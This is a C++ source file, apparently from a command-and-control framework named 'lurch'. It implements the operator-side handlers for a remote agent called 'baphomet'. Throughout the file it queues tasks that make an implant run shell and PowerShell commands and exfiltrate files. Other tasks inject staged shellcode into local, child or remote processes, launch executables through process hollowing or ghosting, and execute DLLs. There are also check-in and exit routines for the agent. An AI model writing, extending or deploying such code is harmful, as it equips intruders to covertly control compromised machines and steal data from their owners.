//
// Created by diago on 2024-06-06.
//

#include <baphomet.hpp>
#include <components.hpp>


lurch::result<std::string>
lurch::baphomet::cp(reciever_context& ctx) {

    const auto [source, destination] =
        ctx.cmd.get<std::string>("--source", "-s")
            .with<std::string>("--destination", "-d")
            .done();

    return generic_queue_task(
        ctx.cmd,
        { *destination, *source },
        io::format_str("Successfully queued copy operation:\n{} -> {}", *destination, *source)
    );
}

lurch::result<std::string>
lurch::baphomet::cat(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--file-name", "-f").done()).value() },
        "Successfully queued cat."
    );
}

lurch::result<std::string>
lurch::baphomet::cd(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--directory", "-d").done()).value() },
        "Successfully queued directory change."
    );
}

lurch::result<std::string>
lurch::baphomet::mkdir(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--directory", "-d").done()).value() },
       "Successfully queued directory creation."
    );
}

lurch::result<std::string>
lurch::baphomet::rm(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--directory-entry", "-de").done()).value() },
        "Successfully queued directory entry to be deleted."
    );
}

lurch::result<std::string>
lurch::baphomet::ps(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--command", "-c").done()).value() },
        "Successfully queued powershell command to be ran."
    );
}

lurch::result<std::string>
lurch::baphomet::cmd(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--command", "-c").done()).value() },
        "Successfully queued shell command to be ran."
    );
}

lurch::result<std::string>
lurch::baphomet::exfil(reciever_context& ctx) {
    return generic_queue_task(
        ctx.cmd,
        { std::get<0>(ctx.cmd.get<std::string>("--directory-entry", "-de").done()).value() },
         "Successfully queued file to be uploaded."
    );
}

lurch::result<std::string>
lurch::baphomet::indicate_exit(reciever_context &ctx) {

    const auto &[agent_ip, agent_tok] = connected_agent_data;
    if(ctx.address != agent_ip || ctx.tok.token != agent_tok) {
        return error("You cannot perform this action.");
    }

    ctx.delete_self = true;
    inst->log.write(io::format_str("Agent with alias {} is exiting...", ctx.tok.alias), log_type::INFO, log_noise::NOISY);
    return OBJECT_EMPTY_RESPONSE;
}

lurch::result<std::string>
lurch::baphomet::checkin(reciever_context &ctx) {

    if(!connected_agent_data.ip.empty() || !connected_agent_data.token.empty()) {
        return error("Checkin requested, but this object is already in use.");
    }

    connected_agent_data.ip     = ctx.address;
    connected_agent_data.token  = ctx.tok.token;

    return { io::format_str("Baphomet agent checked in from: {}", ctx.address) };
}

lurch::result<std::string>
lurch::baphomet::runshellcode(reciever_context& ctx) {

    const auto [file_name, child, local, pid] =
        ctx.cmd.get<std::string>("--staged-file", "-sf")
            .with<empty>("--child", "-c")
            .with<empty>("--local", "-l")
            .with<int64_t>("--pid", "-p")
            .done();


    if(!file_is_staged(*file_name)) {
        return error("that file has not been staged.");
    }

    //
    // Validate arguments
    //

    uint16_t opt_arg_cnt = 0;
    if(child)
        ++opt_arg_cnt;
    if(local)
        ++opt_arg_cnt;
    if(pid)
        ++opt_arg_cnt;

    if(!opt_arg_cnt) {
        return error("please specify a location for execution.");
    }

    if(opt_arg_cnt > 1) {
        return error("please specify exactly one execution location.");
    }

    if(pid && *pid < 0) {
        return error("please specify a valid PID.");
    }


    std::vector<std::string> queue_args;
    std::string queue_msg;

    if(pid) {
        queue_args = {*file_name, std::to_string(*pid)};
        queue_msg  = "Queued shellcode to be ran in a remote process.";
    } else if(local) {
        queue_args = {*file_name, "local"};
        queue_msg  = "Queued shellcode to be ran locally.";
    } else {
        queue_args = {*file_name, "child"};
        queue_msg = "Queued shellcode to be ran in a child process.";
    }

    return generic_queue_task(ctx.cmd, queue_args, queue_msg);
}


lurch::result<std::string>
lurch::baphomet::runexe(reciever_context& ctx) {

    const auto [file_name, hollow, ghost] =
    ctx.cmd.get<std::string>("--staged-file", "-sf")
        .with<empty>("--hollow", "-h")
        .with<empty>("--ghost", "-g")
        .done();

    std::string type;
    if((hollow && ghost) || (!hollow && !ghost) ) {
        return error("Please specify either hollowing or ghosting.");
    }

    if(file_name->find_first_of('.') == std::string::npos) {
        return error("invalid file name.");
    }

    if(!file_is_staged(*file_name)) {
        return error("this file has not been staged.");
    }

    hollow
        .and_then([&](empty exists) {
            type = "hollow";
            return std::optional(exists);
        })
        .or_else([&] {
            type = "ghost";
            return std::optional<empty>(std::nullopt);
        });

    return delimit_command({"runexe", *file_name, type})
        .and_then([&](std::string task_string) {
            tasks.push(task_string);
            return result<std::string>("queued executable to be ran:" + file_name.value());
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::rundll(reciever_context& ctx) {

    const std::string file_name = std::get<0>(ctx.cmd.get<std::string>("--staged-file", "-sf").done()).value();
    if(!file_is_staged(file_name)) {
        return error("that file has not been staged.");
    }

    return generic_queue_task(
        ctx.cmd,
        { file_name },
        "Successfully queued DLL to be executed."
    );
}


lurch::result<std::string>
lurch::baphomet::print_tasks() const {

    //
    // std::queue does not have iterators.
    // we need to create a copy and pop each element one by one.
    //

    std::queue copy_queue(tasks);
    std::string buff;

    while(!copy_queue.empty()) {
        buff += copy_queue.front() + '\n';
        copy_queue.pop();
    }

    if(buff.empty()) {
        return error("no tasks available.");
    }

    buff.pop_back();
    return { buff };
}


lurch::result<std::string>
lurch::baphomet::generic_queue_task(
        const command &cmd,
        std::vector<std::string> args,
        const std::string &queue_message
    ) {

    args.insert(args.begin(), cmd.name);
    return delimit_command(args)
        .and_then([&](std::string task_str) {
            tasks.push(task_str);
            return result<std::string>(queue_message);
        })
        .or_else([&](std::string err) {
            return result<std::string>(error(err));
        });
}


lurch::result<std::string>
lurch::baphomet::print_staged_files() const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        std::string result;
        for(const auto& path : *file_list) {
            result += path.string() + '\n';
        }

        result.pop_back(); //remove trailing \n char
        return { result };
    }
    else {
        return file_list.error();
    }
}


lurch::result<std::string>
lurch::baphomet::clear_tasks() {
    if(tasks.empty()) {
        return error("no tasks exist");
    }

    while(!tasks.empty())
        tasks.pop();

    return { "cleared tasks." };
}


bool
lurch::baphomet::file_is_staged(const std::string &file_name) const {

    if(const auto file_list = inst->db.fileman_get_file_list(id)) {
        for(const auto& file : *file_list) {
            if(file_name == file) {
                return true;
            }
        }
    }

    return false;
}


lurch::result<std::string>
lurch::baphomet::get_task(reciever_context& ctx) const {

    ctx.log_if_error = false;
    if(tasks.empty()) {
        return error("no tasks available.");
    }

    const std::string task = tasks.front();
    return { task };
}


lurch::result<std::string>
lurch::baphomet::complete_task(reciever_context& ctx) {
    if(tasks.empty()) {
        return error("no tasks to be completed.");
    }

    tasks.pop();
    return OBJECT_EMPTY_RESPONSE;
}


lurch::result<std::string>
lurch::baphomet::delimit_command(const std::vector<std::string> &strings) {

    std::string buff;
    for(const auto& str : strings) {
        if(str.find_first_of(AGENT_DELIMITING_CHAR) != std::string::npos) {
            return error("couldn't format command, invalid character used.");
        }

        buff += str + AGENT_DELIMITING_CHAR;
    }

    return { buff };
}